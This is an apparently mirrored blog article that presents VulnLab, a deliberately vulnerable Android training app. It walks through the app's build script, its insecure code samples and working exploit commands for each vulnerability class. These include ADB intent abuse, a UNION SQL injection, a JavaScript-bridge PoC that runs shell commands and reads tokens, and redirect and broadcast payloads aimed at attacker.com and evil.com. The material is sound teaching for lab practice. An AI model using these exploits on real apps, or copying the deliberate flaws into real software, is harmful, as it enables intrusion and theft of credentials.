---
title: "Deliberately Vulnerable Android App Covering Every OWASP Mobile Top 10 Class"
description: "A hands-on reference for mobile security researchers, bug bounty hunters, and anyone preparing for Android penetration testing."
image: "https://cdn-images-1.medium.com/max/800/1*aOYKFwIgWfQhN6th500kng.png"
---

# Deliberately Vulnerable Android App Covering Every OWASP Mobile Top 10 Class


<img src="https://cdn-images-1.medium.com/max/800/1*aOYKFwIgWfQhN6th500kng.png" alt="Cover image" width="1024" height="1536" loading="eager" fetchpriority="high" decoding="async" />

:::info Article Metadata
- **Category:** CTI
- **Source article:** [https://medium.com/@1200km/deliberately-vulnerable-android-app-covering-every-owasp-mobile-top-10-class-7be775fc6415](https://medium.com/@1200km/deliberately-vulnerable-android-app-covering-every-owasp-mobile-top-10-class-7be775fc6415)
- **Published:** 2026-04-08
- **Preserved media:** 2 image(s), including cover images, screenshots, diagrams, and infographics where present.
- **Preserved technical blocks:** 30 code/configuration block(s).
:::

## Ecosystem Fit

This page mirrors the original Medium article into the 1200km.com Docusaurus ecosystem. The original article flow, images, screenshots, infographics, and technical blocks are preserved from the export.

### A hands-on reference for mobile security researchers, bug bounty hunters, and anyone preparing for Android penetration testing.

<img src="https://cdn-images-1.medium.com/max/800/1*aOYKFwIgWfQhN6th500kng.png" alt="Article image" width="1024" height="1536" loading="lazy" decoding="async" />

## Table of Contents

- **Introduction**

- **Why Another Vulnerable App?**

- **The Build Pipeline**

- **Vulnerability Classes**

- **Lab Setup**

- **Key Lessons**

- **Get the Code**

### Introduction

When you are learning Android security, finding a real target to practice on is the hard part. Real apps have legal constraints, rate limits, and changing attack surfaces. Intentionally vulnerable apps like DIVA and InsecureBankv2 exist, but they are old, require Gradle to build, skip several vulnerability classes, and were not designed to reflect modern Android behavior (API 33+).

So I built one from scratch.

**VulnLab**is a purpose-built vulnerable Android app that covers all major vulnerability classes from the OWASP Mobile Top 10 and the Android attack surface. Every class has working exploit commands, real emulator screenshots, and source code annotated with attack vectors. It builds with a single shell script — no Gradle, no Android Studio, no IDE required.

This article walks through what I built, why each vulnerability is interesting, and how to exploit every single one of them.

<img src="https://cdn-images-1.medium.com/max/800/0*xaKFrUmdndPfyuQz.png" alt="Article image" width="1280" height="720" loading="lazy" decoding="async" />

[**GitHub - anpa1200/Vulnerable-APK**
*Contribute to anpa1200/Vulnerable-APK development by creating an account on GitHub.*github.com](https://github.com/anpa1200/Vulnerable-APK)[](https://github.com/anpa1200/Vulnerable-APK)

## Why Another Vulnerable App?

Most existing labs have at least one of these problems:

- **Gradle dependency.**Building DIVA or InsecureBankv2 today means fighting deprecated Gradle versions, SDK conflicts, and Kotlin migration issues. I wanted something that builds in 30 seconds on any machine with the Android SDK installed.

- **Old API targets.**Many apps target API 21–24. On modern emulators (API 33), several exploits simply don’t work because the behaviors changed. VulnLab targets API 28 (for maximum compatibility and intentionally reduced restrictions) while being installable and testable on API 33.

- **Missing classes.**No existing lab app has a working JavaScript bridge RCE demo with full file read and shell command execution. No app demonstrates PendingIntent misuse with FLAG_MUTABLE the way real vulnerabilities manifest. VulnLab covers all of these.

- **No real screenshots.**Documentation showing`[expected output]`is not the same as a real emulator screenshot. Every exploit in VulnLab has been confirmed against a live Android Virtual Machine.

## The Build Pipeline

Most Android developers never build without Gradle. But Gradle is a convenience layer over four core tools that have been in the Android SDK since the beginning:

```text
aapt  →  javac  →  d8  →  aapt 
package
  →  zipalign  →  apksigner
```

Here is the complete build pipeline in about 50 lines of shell:

```text
#!/usr/bin/env bash
set
 -euo pipefail
# 1. Generate R.java
$BUILD_TOOLS
/aapt package -f -m \
    -S res -J gen -M AndroidManifest.xml -I 
$PLATFORM
# 2. Compile Java → .class
javac -
source
 8 -target 8 \
    -classpath 
$PLATFORM
 \
    -sourcepath src:gen \
    -d build/classes \
    $(find src gen -name 
"*.java"
)
# 3. DEX compilation
$BUILD_TOOLS
/d8 \
    --output build/ \
    --lib 
$PLATFORM
 \
    $(find build/classes -name 
"*.class"
)
# 4. Package APK
$BUILD_TOOLS
/aapt package -f \
    -M AndroidManifest.xml -S res \
    -I 
$PLATFORM
 -F build/VulnLab_unsigned.apk build/
# Add classes.dex
cd
 build && zip -u VulnLab_unsigned.apk classes.dex && 
cd
 ..
# 5. Align + sign
$BUILD_TOOLS
/zipalign -f 4 build/VulnLab_unsigned.apk build/VulnLab_aligned.apk
$BUILD_TOOLS
/apksigner sign \
    --ks debug.keystore --ks-pass pass:android \
    --out VulnLab.apk build/VulnLab_aligned.apk
SDK=/usr/lib/android-sdk
BUILD_TOOLS=
$SDK
/build-tools/34.0.0
PLATFORM=
$SDK
/platforms/android-34/android.jar
```

One gotcha I hit:**d8 with JDK 25 crashes on anonymous inner classes.**The d8 bundled with build-tools 34.0.0 has a bug where it cannot read parameter names from anonymous classes compiled by JDK 25 (`NullPointerException: Cannot invoke "String.length()"`). The fix is to convert all anonymous inner classes to named static inner classes. I hit this in three places:`WebViewClient`,`HostnameVerifier`, and the button`OnClickListener`in`MainActivity`.

## Vulnerability Classes

### 1. Exported Components & Unauthorized Admin Access

Android’s`AndroidManifest.xml`controls which components are accessible from other apps. Any activity declared with`android:exported="true"`and no`android:permission`is reachable by anyone — including ADB.

```text
<
activity
    
android:name
=
".AdminActivity"
    
android:exported
=
"true"
 />
    
<!-- No permission — any caller can start this -->
```

The`AdminActivity`reads admin flags directly from Intent extras with no authentication:

```text
String
 
action
 
=
 getIntent().getStringExtra(
"action"
);
boolean
 
isAdmin
 
=
 getIntent().getBooleanExtra(
"isAdmin"
, 
false
);
performAdminAction(action);
```

**Exploit**:

```text
adb shell am start \
    -n com.vulnlab.insecureapp/.AdminActivity \
    --ez isAdmin 
true
 --es action deleteAll
```

This is not theoretical. Many production apps have exported activities that were meant to be internal, especially old apps that predate API 31 (where`android:exported`became mandatory for components with intent filters). Bug bounty hunters frequently find exported activities that expose account management, support backdoors, or internal debugging screens.

### 2. Intent Redirection & PendingIntent Misuse

**Intent Redirection**is when an app receives an Intent from an external caller, extracts a nested`Intent`from it, and forwards that nested Intent without validating the target component. Because`startActivity`runs under the forwarding app's identity, the attacker can reach components the victim app can access but the attacker cannot directly.

```text
Intent
 
nextIntent
 
=
 intent.getParcelableExtra(
"next_intent"
);
context.startActivity(nextIntent);   
// runs as victim app's UID
```

**PendingIntent Misuse**is the mirror image. When an app creates a`PendingIntent`with`FLAG_MUTABLE`wrapping an empty`Intent`and passes it to an untrusted receiver, that receiver can fill in any component:

```text
PendingIntent
 
pi
 
=
 PendingIntent.getActivity(
    
this
, 
0
,
    
new
 
Intent
(),                
// no component — mutable!
    PendingIntent.FLAG_MUTABLE   
// receiver can set component
);
```

This is how several real-world escalation chains work: attacker gets a`PendingIntent`from a notification listener, fills in an unexported activity, and the system launches it with the victim app's full permissions.

Fix: always use`FLAG_IMMUTABLE`and always specify an explicit component in the base Intent.

### 3 .ContentProvider SQL Injection & Path Traversal

ContentProviders are Android’s inter-process database and file sharing mechanism. They are a rich attack surface because they are often exported without permissions and frequently contain unparameterized SQL.

**SQL Injection:**

```text
/
/
 Caller controls 
both
 
'path'
 (URI segment) 
and
 
'selection'
 (
WHERE
 clause)
Cursor
 c 
=
 db.rawQuery(
    "SELECT * FROM " 
+
 path 
+
 " WHERE " 
+
 selection,
    
null
    
/
/
 
no
 bind parameters
);
```

```text
# Dump the secrets table via UNION injection
adb shell content query \
    --uri content://com.vulnlab.insecureapp.provider/users \
    --
where
 
"1=1 UNION SELECT key,value,null,null,null FROM secrets--"
```

Output:

```text
Row:
 
0
 _id=
1
, 
key
=api_key, value=sk-live-abc123secretkey456
Row:
 
1
 _id=
2
, 
key
=db_password, value=SuperSecret_DB_Pass_2024!
```

**Path Traversal:**

```text
String
 
fileName
 
=
 uri.getLastPathSegment();  
// e.g. "../../shared_prefs/creds.xml"
File
 
file
 
=
 
new
 
File
(getContext().getFilesDir(), fileName);
return
 ParcelFileDescriptor.open(file, MODE_READ_ONLY);
```

No canonical path check means`../`sequences traverse outside the intended directory.

### 4. Deep Link Parameter Injection & OAuth Token Hijacking

Android deep links let external URLs open specific app screens. They are a direct attack surface from the web to the app — any app can send a deep link, and browsers handle them without confirmation.

VulnLab registers three deep link schemes:

```text
<!-- Custom scheme -->
<
data
 
android:scheme
=
"vulnlab"
 
android:host
=
"app"
 />
<!-- HTTPS App Link (without autoVerify — can be intercepted) -->
<
data
 
android:scheme
=
"https"
 
android:host
=
"app.vulnlab.com"
 />
<!-- OAuth callback -->
<
data
 
android:scheme
=
"com.vulnlab.oauth"
 
android:host
=
"callback"
 />
```

Two bugs in the handler:

**Token logged to logcat:**

```text
Log.
w
(TAG, 
"Reset token from deep link: "
 + token);
// Readable by any app with READ_LOGS on older Android
```

**Open redirect — attacker-controlled URL loaded in WebView:**

```text
String
 
redirect
 
=
 uri.getQueryParameter(
"redirect"
);
webView.loadUrl(redirect);   
// no validation
```

Combined with the JS bridge in the WebView, this is a remote code execution chain via a single crafted URL.

```text
adb shell am 
start
 
-
a android.intent.action.VIEW \
    
-
d "vulnlab://app/reset?token=SECRET&redirect=http://attacker.com/pwn.html"
```

### 5. Broadcast Receiver Hijack

Exported broadcast receivers are effectively public APIs — any app, any ADB command can send them broadcasts.`ConfigReceiver`trusts whatever`server_url`arrives in the broadcast and saves it as the API endpoint:

```text
String serverUrl = intent.
getStringExtra
(
"server_url"
);
prefs.
edit
().
putString
(
"api_server_url"
, serverUrl).
apply
();
```

One broadcast and all the app’s API traffic routes to`[http://attacker.com](http://attacker.com)`[.](http://attacker.com)

**Android 8+ Note:**Implicit broadcasts (`am broadcast -a &lt;action&gt;`) are blocked for background receivers on API 26+. You must use explicit component targeting:

```text
# Wrong (blocked on API 26+):
adb shell am broadcast -a com.vulnlab.ACTION_UPDATE_CONFIG --es server_url http://evil.com
# Correct:
adb shell am broadcast \
    -n com.vulnlab.insecureapp/.ConfigReceiver \
    --es server_url 
"http://attacker.com"
```

This catches a lot of researchers who test on modern emulators and conclude the broadcast vulnerability “doesn’t work.”

### 6. Insecure Data Storage (No Root Required)

The`debuggable=true`manifest flag changes everything.`adb run-as`allows shell access to the app's private directory without root on any debuggable app:

```text
adb shell run-
as
 com.vulnlab.insecureapp \
    cat /
data
/
data
/com.vulnlab.insecureapp/shared_prefs/vulnlab_prefs.xml
```

Output:

```text
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<
map
>
    
<
string
 
name
=
"admin_password"
>
Admin@123!
</
string
>
    
<
string
 
name
=
"auth_token"
>
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9...
</
string
>
    
<
string
 
name
=
"api_key"
>
sk-live-abc123secretkey456
</
string
>
</
map
>
```

Four storage anti-patterns are demonstrated:

- Plaintext SharedPreferences (password, JWT, API key)

- Session JSON on external storage (`/sdcard/Android/data/.../files/session.json`) — readable without any permissions

- RSA private key stored as cleartext PEM in internal files

- Credentials logged to logcat (`Log.d(...)`)

The most impactful real-world variants combine`allowBackup=true`with cleartext storage — an attacker with USB access can clone the entire app state with`adb backup`.

### 7. Cryptography Failures

This module demonstrates five distinct cryptographic failures that are common in real-world Android apps:

**AES/ECB — the ECB penguin problem:**

```text
Cipher.getInstance(
"AES/ECB/PKCS5Padding"
)
```

ECB mode encrypts each 16-byte block independently. Identical plaintext blocks produce identical ciphertext blocks — patterns leak through the ciphertext. The classic illustration of this is the “ECB penguin”: a Linux penguin image encrypted with AES/ECB still reveals the penguin’s outline because uniform color regions encrypt to uniform ciphertext blocks. This is a conceptual illustration of the structural weakness, not an Android-specific demo — the same principle applies any time structured data (user records, JSON fields, repeated tokens) is encrypted with ECB.

**Static IV with AES/CBC:**

```text
byte
[] iv = 
new
 
byte
[
16
];  
// all zeros, every time
```

CBC with a fixed IV is deterministic. The first two blocks of ciphertext are always the same for the same plaintext — breaks semantic security and enables chosen-plaintext attacks.

**MD5 for passwords:**

```text
MessageDigest.getInstance(
"MD5"
)
```

MD5 is broken for collision resistance and is fast enough that a modern GPU can compute billions of hashes per second. Without a salt, rainbow tables crack any common password instantly.

`**java.util.Random**`**seeded with system time:**

```text
new 
Random
(System.currentTimeMillis())
```

An attacker who knows approximately when the token was generated can brute-force the seed in milliseconds. Use`SecureRandom`— it uses OS entropy and is not predictable.

**Disabled hostname verifier:**

```text
HttpsURLConnection.
setDefaultHostnameVerifier
((hostname, session) 
->
 
true
);
```

Every HTTPS connection accepts any certificate. Combined with`usesCleartextTraffic=true`and the user CA trust in the network security config, the app is trivially intercepted with Burp Suite.

### 8. Insecure WebView + JavaScript Bridge RCE

This is the most impactful single component in the app. The combination of unrestricted JavaScript execution, file access from file URLs, universal cross-origin access, and a powerful JavaScript bridge creates a full remote code execution primitive from any loaded page.

```text
settings.
setJavaScriptEnabled
(
true
);
settings.
setAllowFileAccess
(
true
);
settings.
setAllowFileAccessFromFileURLs
(
true
);
settings.
setAllowUniversalAccessFromFileURLs
(
true
);
webView.
addJavascriptInterface
(
new
 
AppBridge
(
this
), 
"Android"
);
```

The bridge exposes three methods:

- `Android.readFile(path)`— reads any file the app can access

- `Android.getAuthToken()`— returns the stored auth token

- `Android.execCommand(cmd)`— runs a shell command via`Runtime.getRuntime().exec()`

PoC HTML:

```text
<
script
>
  
var
 cmd   = 
Android
.
execCommand
(
"id"
);
  
var
 prefs = 
Android
.
readFile
(
"/data/data/com.vulnlab.insecureapp/shared_prefs/vulnlab_prefs.xml"
);
  
var
 token = 
Android
.
getAuthToken
();
  
document
.
body
.
innerHTML
 =
    
"<pre>CMD: "
+cmd+
"\nPREFS:\n"
+prefs+
"\nTOKEN: "
+token+
"</pre>"
;
</
script
>
```

**Android 13 gotcha:**WebView blocks`file:///sdcard/`URLs due to scoped storage. The PoC file must be staged in the app's own internal directory:

```text
adb push /tmp/poc.html /
data
/
local
/tmp/poc.html
adb shell run-as com.vulnlab.insecureapp \
    cp /
data
/
local
/tmp/poc.html \
    /
data
/
data
/com.vulnlab.insecureapp/files/poc.html
adb shell am 
start
 -n com.vulnlab.insecureapp/.WebViewActivity \
    --es url 
"file:///data/data/com.vulnlab.insecureapp/files/poc.html"
```

Real-world analogue: hybrid apps using Cordova or WebView bridges frequently expose similar functionality. This is a known critical class in the Android security ecosystem — CVE-2012–6636 was the original`addJavascriptInterface`RCE, which Google addressed in API 17 (Android 4.2) by restricting the bridge to methods annotated with`@JavascriptInterface`. However, API 17 only closed the unannotated-method reflection path; it did not prevent developers from intentionally exposing dangerous methods via`@JavascriptInterface`. The patterns around file access flags (`setAllowFileAccessFromFileURLs`,`setAllowUniversalAccessFromFileURLs`) and custom bridges with powerful capabilities remain fully exploitable on all modern Android versions when developers opt into them.

### 9. Dynamic Code Loading

`DexClassLoader`is the standard way to load code at runtime on Android. It becomes a vulnerability when the DEX source is not integrity-checked:

```text
String
 
dexPath
 
=
 Environment.getExternalStorageDirectory()
    + 
"/vulnlab_plugins/update.dex"
;
DexClassLoader
 
loader
 
=
 
new
 
DexClassLoader
(dexPath, optDir, 
null
, getClassLoader());
Class<?> plugin = loader.loadClass(
"com.vulnlab.plugin.UpdatePlugin"
);
plugin.getMethod(
"run"
).invoke(plugin.newInstance());
```

The primary threat actor here is an attacker with USB/ADB access — they can push a malicious DEX directly to`/sdcard/vulnlab_plugins/update.dex`without any app permissions. On Android 10+ scoped storage limits what third-party apps can write to shared external storage, so the`WRITE_EXTERNAL_STORAGE`path is largely closed for installed apps on modern devices. The more realistic scenarios remain: physical access (USB), a pre-installed app with`MANAGE_EXTERNAL_STORAGE`, or a companion app that has been granted legacy storage access. The core issue — loading code from an unverified, user-writable path — is the vulnerability regardless of how the DEX gets there.

Real-world analogue: this exact pattern was found in several popular apps using plugin architectures that loaded updates from external storage before their own integrity validation was added.

Using APK Hunter for Automated Analysis

VulnLab is an ideal target for the APK Hunter tool — a five-phase AI-powered Android analysis pipeline:

- **Static analysis**— JADX decompilation + androguard manifest parsing + AI vulnerability identification

- **Exploit planning**— AI generates ranked, targeted exploit commands

- **Dynamic exploitation**— ADB execution with output capture

- **Proof validation**— real emulator screenshots for each finding

- **Report generation**— Markdown/PDF report with CVSS scores

```text
python3 /path/to/apk-hunter/cli.py analyze VulnLab.apk
```

Running it against VulnLab produces a report that identifies all 12 vulnerability instances with working exploit commands and real screenshots. It’s a useful benchmark for evaluating the tool’s detection coverage.

## Lab Setup

[**Building an Android App Analysis Lab on Ubuntu: A Practical Setup Guide**
[A practical step-by-step guide to building an Android malware analysis and security testing lab on Ubuntu](2026-04-06-building-an-android-app-analysis-lab-on-ubuntu-a-practical-setup-guide-4a09fff37622.md)

[**Android Emulation & Virtualisation**
[Complete Research Lab Guide. From Zero to a Fully Instrumented Android Research Environment](2026-04-07-android-emulation-and-virtualisation-2f6b33fcc4aa.md)

```text
# Create Android 13 emulator
sdkmanager 
"system-images;android-33;google_apis;x86_64"
avdmanager create avd -n vulnlab -k 
"system-images;android-33;google_apis;x86_64"
# Launch headless
emulator -avd vulnlab -
no
-window -
no
-audio -gpu swiftshader_indirect &
adb 
wait
-
for
-device
until
 adb shell getprop sys.boot_completed | 
grep
 -
q
 
1
; 
do
 
sleep
 
2
; done
# Install VulnLab
adb install VulnLab.apk
# Verify install
adb shell pm list packages | 
grep
 vulnlab
```

## Key Lessons

Building this app clarified several things about Android security that are easy to miss:

**1.**`**debuggable=true**`**is catastrophic in production.**It enables`adb run-as`without root, JDWP attachment for live debugging, heap dumps, and backup extraction. A single manifest flag turns a secured app into an open book.

**2. Modern Android mitigations change exploitation paths.**Android 8 blocked implicit broadcasts. Android 10 added scoped storage. Android 12 made`FLAG_IMMUTABLE`the default for PendingIntents. Exploits that work against API 24 may not work against API 33 — testers need to know which mitigations apply to their target's`targetSdkVersion`.

**3. The JavaScript bridge is underappreciated as an attack surface.**`addJavascriptInterface`has been documented since 2012, but hybrid app frameworks continue to expose powerful native bridges to WebViews without proper origin validation. The attack surface is not the API itself — it's the combination of bridge + file access + lack of CSP.

**4. Cryptographic failures compound.**AES/ECB alone leaks patterns. A static IV alone breaks semantic security. MD5 alone is weak. But the combination in a real app — where the encrypted data is stored in cleartext SharedPreferences and the key is hardcoded in the APK — means the entire encryption is theater.

**5. Explicit vs. implicit broadcast targeting matters.**The single most common reason broadcast receiver exploits “don’t work” on modern Android is that researchers use`am broadcast -a &lt;action&gt;`when they need`-n &lt;component&gt;`. Know which Android version introduced which restriction.

## Get the Code

The full source is on GitHub:

[**GitHub - anpa1200/Vulnerable-APK**
*Contribute to anpa1200/Vulnerable-APK development by creating an account on GitHub.*github.com](https://github.com/anpa1200/Vulnerable-APK)[](https://github.com/anpa1200/Vulnerable-APK)

Package name:`com.vulnlab.insecureapp`
Build time: ~30 seconds
Target: Android 9 (API 28), tested on API 33
License: MIT

&gt; For authorized security research, CTF practice, and education only. Do not install on devices used in production or with real accounts.

*All vulnerabilities are intentional. Every exploit command has been verified against a live Android 13 emulator. Screenshots are included in the repository.*

## Follow for practical cybersecurity research

If you’re interested in**Offensive security,****AI security, real-world attack simulations, CTI, and detection engineering**— this is exactly what I focus on.

Stay connected:

→**Subscribe on Medium:**[medium.com/@1200km](https://medium.com/@1200km)
→**Connect on LinkedIn:**[andrey-pautov](https://www.linkedin.com/in/andrey-pautov/)
→**GitHub — tools & labs:**[github.com/anpa1200](https://github.com/anpa1200)
→**Contact:**[1200km@gmail.com](mailto:1200km@gmail.com)
